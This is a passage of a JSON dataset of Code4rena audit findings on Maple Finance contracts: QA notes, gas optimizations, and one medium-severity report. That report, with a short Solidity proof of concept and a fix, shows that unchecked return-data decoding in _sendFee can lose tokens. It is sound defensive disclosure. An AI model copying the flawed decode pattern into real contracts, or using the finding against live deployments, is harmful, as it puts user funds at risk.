\"xMPL:PM:TOO_EARLY\");\n```\nhttps://github.com/maple-labs/xMPL/blob/23301839c389142f9e75d88121316d9751833b71/contracts/xMPL.sol#L51-L58\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/18"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low-impact Issues\n\n### Treasury fees are given to the lender on failure, rather than reverting\n```solidity\n        if (!_sendFee(_mapleGlobals(), IMapleGlobalsLike.mapleTreasury.selector, treasuryFee_)) {\n            _claimableFunds += treasuryFee_;\n        }\n```\nhttps://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L321-L323\n\n\n### Inconsistent `approve()` behavior between `ERC20` and `RevenueDistributionToken`\n`RevenueDistributionToken` considers an approval value of `type(uint256).max` as 'allow all amounts':\n```solidity\n        if (callerAllowance == type(uint256).max) return;\n```\nhttps://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L279\n\nwhereas `ERC20` considers it as a numerical amount:\n```solidity\n        _approve(owner_, msg.sender, allowance[owner_][msg.sender] - amount_);\n```\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L110\n\nThese inconsistences will likely lead to confusion at some point in the future.\n\n### Incorrect revert string in `setEndingPrincipal()`\n```solidity\n        require(endingPrincipal_ <= _principal, \"R:DP:ABOVE_CURRENT_PRINCIPAL\");\n```\nhttps://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/Refinancer.sol#L43\n\nIt should be `\"R:SEP:ABOVE_CURRENT_PRINCIPAL\"`.\n\n### IERC20 should be named IERC20Permit\n1. File: erc20-1.0.0-beta.2/contracts/interfaces/IERC20.sol (lines [4-5](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L4-L5))\nThere may be cases in the future where you may not want EIP-2612 functionality due to deployment costs, and having the name `IERC20` taken will cause problems\n```solidity\n/// @title Interface of the ERC20 standard as defined in the EIP, including ERC-2612 permit functionality.\ninterface IERC20 {\n```\n\n### IERC20 incorrectly includes `PERMIT_TYPEHASH`\n`PERMIT_TYPEHASH` is not part of the requirements for EIP-2612, so it shouldn't appear in the interface. \n```solidity\n    /**\n     *  @dev    Returns the permit type hash.\n     *  @return permitTypehash_ The permit type hash.\n     */\n    function PERMIT_TYPEHASH() external view returns (bytes32 permitTypehash_);\n```\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L134-L138\nOpenZeppelin has it as a `private` `constant`: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/52eeebecda140ebaf4ec8752ed119d8288287fac/contracts/token/ERC20/extensions/draft-ERC20Permit.sol#L28\n\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1. File: revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol (line [73](https://github.com/maple-labs/revenue-distribution-token/blob/41a3e40bf8c109ff19b38b80fde300c44fd42a3d/contracts/RevenueDistributionToken.sol#L73))\n```solidity\n        pendingOwner = pendingOwner_;\n```\n\n### Open TODOs\nThere are many open TODOs throughout the various test files, but also some among the code files\n```\n./revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol:    // TODO: Revisit returns\n./revenue-distribution-token-1.0.0-beta.1/contracts/RevenueDistributionToken.sol:        // TODO: investigate whether leave this `require()` in for clarity from error message, or let the safe math check in `callerAllowance - shares_` handle the underflow.\n```\n\n### Incorrect Natspec\n```solidity\n     *  @dev   Emits an event indicating that one account has set the allowance of another account over their tokens.\n```\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L12\nThe natspec doesn't mention that the event is also emitted when `transferFrom()` is called, even though the natspec for `transferFrom()` explicitly mentions it.\n\n## Non-critical Issues\n\n### `_processEstablishmentFees()` should emit events when fee processing fails\n```solidity\n    function _processEstablishmentFees(uint256 delegateFee_, uint256 treasuryFee_) internal {\n        if (!_sendFee(_lender, ILenderLike.poolDelegate.selector, delegateFee_)) {\n            _claimableFunds += delegateFee_;\n        }\n\n        if (!_sendFee(_mapleGlobals(), IMapleGlobalsLike.mapleTreasury.selector, treasuryFee_)) {\n            _claimableFunds += treasuryFee_;\n        }\n    }\n```\nhttps://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L316-L324\n\n### Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\n\n1. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (lines [32-34](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L32-L34))\n```solidity\n    mapping(address => uint256) public override balanceOf;\n\n    mapping(address => mapping(address => uint256)) public override allowance;\n```\n\n### Use scientific notation (e.g. `10e18`) rather than exponentiation (e.g. `10**18`)\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanInternals.sol (line [14](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanInternals.sol#L14))\n```solidity\n    uint256 private constant SCALED_ONE = uint256(10 ** 18);\n```\n\n### `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1. File: loan-3.0.0-beta.1/contracts/MapleLoanFactory.sol (lines [16-18](https://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/MapleLoanFactory.sol#L16-L18))\n```solidity\n    function createInstance(bytes calldata arguments_, bytes32 salt_)\n        override(IMapleProxyFactory, MapleProxyFactory) public returns (\n            address instance_\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`\n\n1. File: erc20-1.0.0-beta.2/contracts/ERC20.sol (line [2](https://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/ERC20.sol#L2))\n```solidity\npragma solidity ^0.8.7;\n```\n\n### Typos\n`owner` => `owner_`\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L129\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L132\nhttps://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/Migrator.sol#L24\nhttps://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/Migrator.sol#L26\nhttps://github.com/maple-labs/mpl-migration/blob/a99549d96ed12cd4589a02bccf70747dbaebeb5b/contracts/Migrator.sol#L27\nhttps://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IOwnable.sol#L17\n\n`account` => `account_`\nhttps://github.com/maple-labs/loan/blob/4c6fe2cd91d6d16b8434c426fe7eb6d2bc77bc30/contracts/interfaces/IOwnable.sol#L11\n\n`Emits an event` => `Emitted when`\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L12\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L20\n\n`ERC-2612` => `EIP-2612`\nhttps://github.com/maple-labs/erc20/blob/10ccf4aa0b2d6914e3c2d32e454e4d106a99a4fd/contracts/interfaces/IERC20.sol#L4\n\n\n### Grammar\nThroughout the various interfaces, most of the comments have fragments that end with periods. They should either be converted to actual sentences with both a noun phrase and a verb phrase, or the periods should be removed.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/17"
    }
  },
  {
    "title": "Incorrect implementation of Lender can result in lost tokens",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/maple-labs/loan/blob/main/contracts/MapleLoanInternals.sol#L332-L344\n\n\n# Vulnerability details\n\n## Impact\nMapleLoanInternals._sendFee should check returnData.length == 32 before decoding, otherwise if it returns bytes data, the abi.decode will return 0x20, result in lost tokens.\n## Proof of Concept\nhttps://github.com/maple-labs/loan/blob/main/contracts/MapleLoanInternals.sol#L332-L344\nThis contract can test that when the function returns bytes data, abi.encode will decode the return value as 0x20.\n```\npragma solidity 0.8.7;\ncontract A{\n    address public destination;\n    uint256 public number;\n    function convertA() external{\n        (bool su,bytes memory ret )= address(this).call(abi.encodeWithSelector(this.ret.selector));\n        number = ret.length;\n        destination = abi.decode(ret, (address));\n    }\n    function ret() public returns(bytes memory){\n        return \"0x74d754378a59Ab45d3E6CaC83f0b87E8E8719270\";\n    }\n}\n```\n## Tools Used\nNone\n## Recommended Mitigation Steps\n```\n    function _sendFee(address lookup_, bytes4 selector_, uint256 amount_) internal returns (bool success_) {\n        if (amount_ == uint256(0)) return true;\n\n        ( bool success , bytes memory data ) = lookup_.call(abi.encodeWithSelector(selector_));\n\n+       if (!success || data.length != uint256(32)) return false;\n\n        address destination = abi.decode(data, (address));\n\n        if (destination == address(0)) return false;\n\n        return ERC20Helper.transfer(_fundsAsset, destination, amount_);\n    }\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/16"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations\n\n## In all of the contracts\n* <= operation costs less gas then >=, so in every place that there is >=, you can replace the expressions and use <=\n\n## RevenueDistributionToken contract\n* Inline the calls to `convertToAssets` in `previewRedeem` and `balanceOfAssets`. In addition inline the call to `convertToShares` in `previewDeposit`.\n* use unchecked in `_reduceCallerAllowance` (or remove the require like you wrote)\n\n## MapleLoanInternals contract\n* The `_getUnaccountedAmount` function can be split into 2 more functions, one for each case - one function is for the `_collateralAsset` token, one for the `_fundsAsset` token and on for the rest (if the collateral and funds tokens are the same one, this can be checked before the calls to these functions or in these functions, but I don't think that this can happen).\n\n    old code:\n    ```sol\n    /// @dev Returns the amount of an `asset_` that this contract owns, which is not currently accounted for by its state variables.\n    function _getUnaccountedAmount(address asset_) internal view returns (uint256 unaccountedAmount_) {\n        return IERC20(asset_).balanceOf(address(this))\n            - (asset_ == _collateralAsset ? _collateral : uint256(0))                   // `_collateral` is `_collateralAsset` accounted for.\n            - (asset_ == _fundsAsset ? _claimableFunds + _drawableFunds : uint256(0));  // `_claimableFunds` and `_drawableFunds` are `_fundsAsset` accounted for.\n    }\n    ```\n\n    new code:\n    ```sol\n    /// @dev Returns the amount of an `asset_` that this contract owns, which is not currently accounted for by its state variables.\n    function _getUnaccountedAmountRegular(address asset_) internal view returns (uint256 unaccountedAmount_) {\n        return IERC20(asset_).balanceOf(address(this));\n    }\n\n    function _getUnaccountedAmountCollateral() internal view returns (uint256 unaccountedAmount_) {\n        return IERC20(_collateralAsset).balanceOf(address(this)) - _collateral;\n    }\n\n    function _getUnaccountedAmountFunds() internal view returns (uint256 unaccountedAmount_) {\n        return IERC20(_fundsAsset).balanceOf(address(this)) - (_claimableFunds + _drawableFunds);\n    }\n    ```\n\n* Use unchecked in `drawdownFunds` function\n    old code:\n    ```sol\n    collateralPosted_ = postCollateral(\n        additionalCollateralRequired > unaccountedCollateral ? additionalCollateralRequired - unaccountedCollateral : uint256(0)\n    );\n    ```\n\n    new code:\n    ```sol\n    if (additionalCollateralRequired > unaccountedCollateral) {\n        unchecked {\n            collateralPosted_ = postCollateral(additionalCollateralRequired - unaccountedCollateral);\n        }\n    }\n    ```\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/15"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low and Non-critical\n* You should declare that the `RevenueDistributionToken` contract implements the IERC4626 interface\n* Forgot TODO comments before `updateVestingSchedule` and `_reduceCallerAllowance` functions in the `RevenueDistributionToken` contract\n* The `ERC20` contract's solidity version is ^0.8.7, while the other contracts' version is 0.8.7\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/14"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n**Table of Contents:**\n\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [File: xMPL.sol](#file-xmplsol)\n    - [function scheduleMigration()](#function-schedulemigration)\n      - [Cache `block.timestamp + MINIMUM_MIGRATION_DELAY` in memory to save gas](#cache-blocktimestamp--minimum_migration_delay-in-memory-to-save-gas)\n  - [File: RevenueDistributionToken.sol](#file-revenuedistributiontokensol)\n    - [function updateVestingSchedule()](#function-updatevestingschedule)\n      - [Cache `(lastUpdated = block.timestamp) + vestingPeriod_` in memory to save gas](#cache-lastupdated--blocktimestamp--vestingperiod_-in-memory-to-save-gas)\n      - [Emit the memory variable `issuanceRate_` instead of the storage variable `issuanceRate` L92](#emit-the-memory-variable-issuancerate_-instead-of-the-storage-variable-issuancerate-l92)\n    - [function totalAssets()](#function-totalassets)\n      - [Cache `issuanceRate`](#cache-issuancerate)\n      - [Cache `vestingPeriodFinish`](#cache-vestingperiodfinish)\n  - [General recommendations](#general-recommendations)\n    - [Comparisons](#comparisons)\n      - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof)\n    - [For-Loops](#for-loops)\n      - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n      - [Increments can be unchecked](#increments-can-be-unchecked)\n\n## Foreword\n\n- **Storage-reading optimizations**\n\n> The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). In the paragraphs below, please see the `@audit-issue` tags in the pieces of code's comments for more information about SLOADs that could be saved by caching the mentioned **storage** variables in **memory** variables.\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: xMPL.sol\n\n### function scheduleMigration()\n\n```solidity\nFile: xMPL.sol\n76:     function scheduleMigration(address migrator_, address newAsset_) external override onlyOwner {\n77:         require(migrator_ != address(0), \"xMPL:SM:INVALID_MIGRATOR\");\n78:         require(newAsset_ != address(0), \"xMPL:SM:INVALID_NEW_ASSET\");\n79: \n80:         scheduledMigrationTimestamp = block.timestamp + MINIMUM_MIGRATION_DELAY;\n81:         scheduledMigrator           = migrator_;\n82:         scheduledNewAsset           = newAsset_;\n83: \n84:         emit MigrationScheduled(asset, newAsset_, migrator_, scheduledMigrationTimestamp); //@audit cache block.timestamp + MINIMUM_MIGRATION_DELAY\n85:     }\n```\n\n#### Cache `block.timestamp + MINIMUM_MIGRATION_DELAY` in memory to save gas\n\nIt's possible to save 1 SLOAD by saving `block.timestamp + MINIMUM_MIGRATION_DELAY` in a memory variable and use this variable at L80 and L84 instead of emitting the storage variable at L84.\n\n## File: RevenueDistributionToken.sol\n\n### function updateVestingSchedule()\n\n```solidity\nFile: RevenueDistributionToken.sol\n79:     function updateVestingSchedule(uint256 vestingPeriod_) external override returns (uint256 issuanceRate_, uint256 freeAssets_) {\n80:         require(msg.sender == owner, \"RDT:UVS:NOT_OWNER\");\n81:         require(totalSupply != 0,    \"RDT:UVS:ZERO_SUPPLY\");\n82: \n83:         // Update \"y-intercept\" to reflect current available asset.\n84:         freeAssets_ = freeAssets = totalAssets();\n85: \n86:         // Calculate slope.\n87:         issuanceRate_ = issuanceRate = ((ERC20(asset).balanceOf(address(this)) - freeAssets_) * precision) / vestingPeriod_;\n88: \n89:         // Update timestamp and period finish.\n90:         vestingPeriodFinish = (lastUpdated = block.timestamp) + vestingPeriod_; //@audit cache calculation\n91: \n92:         emit VestingScheduleUpdated(msg.sender, vestingPeriodFinish, issuanceRate); //@audit emit issuanceRate_  //@audit use cached calculation\n93:     }\n```\n\n#### Cache `(lastUpdated = block.timestamp) + vestingPeriod_` in memory to save gas\n\nIt's possible to save 1 SLOAD by saving `(lastUpdated = block.timestamp) + vestingPeriod_` in a memory variable and use this variable at L90 and L92 instead of emitting the storage variable `vestingPeriodFinish` at L92.\n\n#### Emit the memory variable `issuanceRate_` instead of the storage variable `issuanceRate` L92\n\nThis can save 1 SLOAD\n\n### function totalAssets()\n\n```solidity\nFile: RevenueDistributionToken.sol\n258:     function totalAssets() public view override returns (uint256 totalManagedAssets_) {\n259:         if (issuanceRate == 0) return freeAssets; //@audit issuanceRate SLOAD 1\n260: \n261:         uint256 vestingTimePassed =\n262:             block.timestamp > vestingPeriodFinish ? //@audit vestingPeriodFinish SLOAD 1\n263:                 vestingPeriodFinish - lastUpdated :  //@audit vestingPeriodFinish SLOAD 2\n264:                 block.timestamp - lastUpdated;\n265: \n266:         return ((issuanceRate * vestingTimePassed) / precision) + freeAssets; //@audit issuanceRate SLOAD 2\n267:     }\n```\n\n#### Cache `issuanceRate`\n\nCaching this in memory can save around 1 SLOAD\n\n#### Cache `vestingPeriodFinish`\n\nCaching this in memory can save around 1 SLOAD\n\n## General recommendations\n\n### Comparisons\n\n#### `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\nmpl-migration/contracts/Migrator.sol:25:        require(amount_ > uint256(0),                                              \"M:M:ZERO_AMOUNT\");\n```\n\nAlso, please enable the Optimizer.\n\n### For-Loops\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\nFile: MapleLoanInternals.sol:258:         for (uint256 i; i < calls_.length; ++i) {\n```\n\n#### Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:  \n\n```solidity\nFile: MapleLoanInternals.sol:258:         for (uint256 i; i < calls_.length; ++i) {\n```\n\nThe code would go from:  \n  \n```solidity\nfor (uint256 i; i < numIterations; ++i) {  \n // ...  \n}  \n```\n\nto:  \n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/12"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Title: State variables that could be set immutable\nSeverity: GAS\n\nIn the following files there are state variables that could be set immutable to save gas. \n\n        name in ERC20.sol\n        symbol in ERC20.sol\n\nTitle: Use calldata instead of memory\nSeverity: GAS\n\n\nUse calldata instead of memory for function parameters\nIn some cases, having function arguments in calldata instead of\nmemory is more optimal.\n    \n\n        xMPL.constructor (name_)\n        ERC20.constructor (symbol_)\n        RevenueDistributionToken.constructor (name_)\n        ERC20.constructor (name_)\n        xMPL.constructor (symbol_)\n        RevenueDistributionToken.constructor (symbol_)\n\n\n\nTitle: Public functions to external\nSeverity: GAS\n\nThe following functions could be set external to save gas and improve code quality. \nExternal call cost is less expensive than of public functions. \n\n        MapleLoan.sol, isProtocolPaused\n\n\n\nTitle: Use unchecked to save gas for certain additive calculations that cannot overflow\nSeverity: GAS\n\n\nYou can use unchecked in the following calculations since there is no risk to overflow:\n\n        RevenueDistributionToken.sol (L#90) - vestingPeriodFinish = (lastUpdated = block.timestamp) + vestingPeriod_; \n        MapleLoanInternals.sol (L#271) - _nextPaymentDueDate = block.timestamp + paymentInterval; \n        MapleLoanInternals.sol (L#302) - _nextPaymentDueDate = block.timestamp + paymentInterval; \n        xMPL.sol (L#80) - scheduledMigrationTimestamp = block.timestamp + MINIMUM_MIGRATION_DELAY;\n        MapleLoanInternals.sol (L#361) - require( nextPaymentDueDate != uint256(0) && (block.timestamp > nextPaymentDueDate + _gracePeriod), \"MLI:R:NOT_IN_DEFAULT\" ); \n\n\n\nTitle: Caching array length can save gas\nSeverity: GAS\n\n\nCaching the array length is more gas efficient.\nThis is because access to a local variable in solidity is more efficient than query storage / calldata / memory.\nWe recommend to change from:    \n\n    for (uint256 i=0; i<array.length; i++) { ... }\n\nto: \n\n    uint len = array.length  \n    for (uint256 i=0; i<len; i++) { ... }\n\n\n        MapleLoanInternals.sol, calls_, 258\n\n\n\nTitle: Storage double reading. Could save SLOAD\nSeverity: GAS\n\nReading a storage variable is gas costly (SLOAD). In cases of multiple read of a storage variable in the same scope, caching the first read (i.e saving as a local variable) can save gas and decrease the\n overall gas uses. The following is a list of functions and the storage variables that you read twice: \n\n        RevenueDistributionToken.sol: vestingPeriodFinish is read twice in totalAssets\n\n\n\nTitle: Unnecessary equals boolean\nSeverity: GAS\n\n\nBoolean variables can be checked within conditionals directly without the use of equality operators to true/false.\n\n        MapleLoanInternals.sol, 337: if (!success || data.length == uint256(0)) return false;\n        MapleLoanInternals.sol, 341: if (destination == address(0)) return false;\n        MapleLoanInternals.sol, 333: if (amount_ == uint256(0)) return true;\n\n\n\nTitle: Prefix increments are cheaper than postfix increments\nSeverity: GAS\n\nPrefix increments are cheaper than postfix increments. \nFurther more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`).\nBut increments perform overflow checks that are not necessary in this case.\nThese functions use not using prefix increments (`++x`) or not using the unchecked keyword: \n\n        just change to unchecked: MapleLoanInternals.sol, i, 258\n\n\n\n\nTitle: Internal functions to private\nSeverity: GAS\n\nThe following functions could be set private to save gas and improve code quality:\n\n        MapleLoanInternals.sol, _acceptNewTerms\n        MapleLoanInternals.sol, _getRefinanceCommitment\n        MapleLoanInternals.sol, _clearLoanAccounting\n        MapleLoanInternals.sol, _scaledExponent\n        MapleLoanInternals.sol, _getNextPaymentBreakdown\n        MapleLoanInternals.sol, _getLateInterest\n        MapleLoanInternals.sol, _getCollateralRequiredFor\n        MapleLoanInternals.sol, _makePayment\n        ERC20.sol, _transfer\n\n\nTitle: Use != 0 instead of > 0\nSeverity: GAS\n\n\nUsing != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)\n\n\n        RevenueDistributionToken.sol, 285: change 'divisor_ > 0' to 'divisor_ != 0'\n\n\n\nTitle: Unused state variables\nSeverity: GAS\n\nUnused state variables are gas consuming at deployment (since they are located in storage) and are \na bad code practice. Removing those variables will decrease deployment gas cost and improve code quality. \nThis is a full list of all the unused storage variables we found in your code base. \n\n        MapleLoanInternals.sol, _pendingBorrower\n        MapleLoanInternals.sol, _pendingLender\n\n\n\nTitle: Unused imports\nSeverity: GAS\n\n\nIn the following files there are contract imports that aren't used\nImport of unnecessary files costs deployment gas (and is a bad coding practice that is important to ignore)\n\n        MapleLoan.sol, line 8, import { IMapleGlobalsLike } from \"./interfaces/Interfaces.sol\";\n        MapleLoanInternals.sol, line 7, import { ILenderLike, IMapleGlobalsLike } from \"./interfaces/Interfaces.sol\";\n        Migrator.sol, line 5, import { IERC20Like } from \"./interfaces/Interfaces.sol\";\n\n\n\nTitle: Unnecessary constructor\nSeverity: GAS\n\nThe following constructors are empty. \n    (A similar issue https://github.com/code-423n4/2021-11-fei-findings/issues/12)\n    \n        MapleLoanFactory.sol.constructor\n        xMPL.sol.constructor\n\n\n\nTitle: Inline one time use functions\nSeverity: GAS\n\n\nThe following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.\n    \n\n        RevenueDistributionToken.sol, _reduceCallerAllowance\n        MapleLoanInternals.sol, _getPaymentBreakdown\n        MapleLoanInternals.sol, _scaledExponent\n        MapleLoanInternals.sol, _getEarlyPaymentBreakdown\n        MapleLoanInternals.sol, _getNextPaymentBreakdown\n        MapleLoanInternals.sol, _getRefinanceInterestParams\n        MapleLoanInternals.sol, _getCollateralRequiredFor\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-maple-findings",
      "repo": "https://github.com/code-423n4/2022-03-maple-findings",
      "url": "https://github.com/code-423n4/2022-03-maple-findings/issues/4"
    }
  },
  {
    "title": "QA Report",
    "body": "\n\n\n\nTitle: Missing commenting\nSeverity: Low Risk\n\n\n        The following functions are missing commenting as describe below:\n        \n        xMPL.sol, scheduleMigration (external), parameters migrator_, newAsset_ not commented\n\n\n\nTitle: Mult instead div in compares\nSeverity: Low Risk\n\n\n    To improve algorithm precision instead using division in comparison use multiplication in the following scenario:\n            \n            Instead a < b / c use a * c < b. \n        \n    \n        MapleLoanInternals.sol, 460, return principal_ <= drawableFunds_ ? uint256(0) : (collateralRequired_ * (principal_ - drawableFunds_)) / principalRequested_;\n        MapleLoanInternals.sol, 486, if (raisedRate <= SCALED_ONE) return ((principal_ - endingPrincipal_) / totalPayments_, uint256(0)); \n        RevenueDistributionToken.sol, 285, return (numerator_ / divisor_) + (numerator_ % divisor_ > 0 ? 1 : 0);\n\n\n\nTitle: Not verified owner\nSeverity: Low Risk\n\n\n        owner param should be validated to make sure the owner address is not address(0).\n        Otherwise if not given the right input all only owner accessible functions will be unaccessible.\n        \n        \n        RevenueDistributionToken.sol.maxWithdraw owner_\n        Migrator.sol.migrate owner\n        RevenueDistributionToken.sol.setPendingOwner pendingOwner_\n        RevenueDistributionToken.sol.maxRedeem owner_\n      \n\n\n\nTitle: Two Steps Verification before Transferring Ownership\nSeverity: Low Risk\n\nThe following contracts have a function that allows them an admin to change it to a different address. If the admin accidentally uses an invalid address for which they do not have the private key, then the system gets locked.\nIt is important to have two steps admin change where the first is announcing a pending new admin and the new address should then claim its ownership. \nA similar issue was reported in a previous contest and was assigned a severity of medium: [code-423n4/2021-06-realitycards-findings#105](https://github.com/code-423n4/2021-06-realitycards-findings/issues/105) \n\n        RevenueDistributionToken.sol\n\n\n\nTitle: safeApprove of openZeppelin is deprecated\nSeverity: Low Risk\n\n\n        You use safeApprove of openZeppelin although it's deprecated.\n        (see https://github.com/OpenZeppelin/openzeppelin-contracts/blob/566a774222707e424896c0c390a84dc3c13bdcb2/contracts/token/ERC20/utils/SafeERC20.sol#L38)\n        You should change it to increase/decrease Allowance as OpenZeppilin says\n        This appears in the following locations in the code base\n        \nDeprecated safeApprove in xMPL.sol line 62:         require(ERC20(oldAsset).approve(migrator, oldAssetBalanceBeforeMigration), \"xMPL:PM:APPROVAL_FAILED\");\n\n\n\n\nTitle: Named return issue\nSeverity: Low Risk\n\nUsers can mistakenly think that the return value is the named return, but it is actually the actualreturn statement that comes after. To know that the user needs to read the code and is confusing.\nFurthermore, removing either the actual return or the named return will save gas. \n\n        MapleLoan.sol, collateralRequired\n        MapleLoan.sol, earlyFeeRate\n        MapleLoan.sol, treasuryFee\n\n\n\n\nTitle: Does not validate the input fee parameter\nSeverity: Low Risk\n\n\nSome fee parameters of functions are not checked for invalid values. Validate the parameters:\n        \n        \n        MapleLoanInternals._getLateInterest (lateFeeRate_)\n        MapleLoanInternals._getPaymentBreakdown (lateFeeRate_)\n        MapleLoanInternals._getRefinanceInterestParams (lateFeeRate_)\n        Refinancer.setLateFeeRate (lateFeeRate_)\n        MapleLoanInternals._setEstablishmentFees (extraDelegateFee_)\n        MapleLoanInternals._processEstablishmentFees (delegateFee_)\n        Refinancer.setEarlyFeeRate (earlyFeeRate_)\n        MapleLoanInternals._setEstablishmentFees (extraTreasuryFee_)\n        MapleLoanInternals._processEstablishmentFees (treasuryFee_)\n\n\n\nTitle: Missing non reentrancy modifier\nSeverity: Low Risk\n\nThe following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.\nEven though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..\n\n        RevenueDistributionToken.sol, acceptOwnership is missing a reentrancy modifier\n        RevenueDistributionToken.sol, updateVestingSchedule is missing a reentrancy modifier\n        RevenueDistributionToken.sol, setPendingOwner is missing a reentrancy modifier\n\n\n\nTitle: Not verified input\nSeverity: Low Risk\n\n\n    external / public functions parameters should be validated to make sure the address is not 0.\n    Otherwise if not given the right input it can mistakenly lead to loss of user funds.\n    \n        \n        MapleLoanInternals.sol._initialize borrower_\n        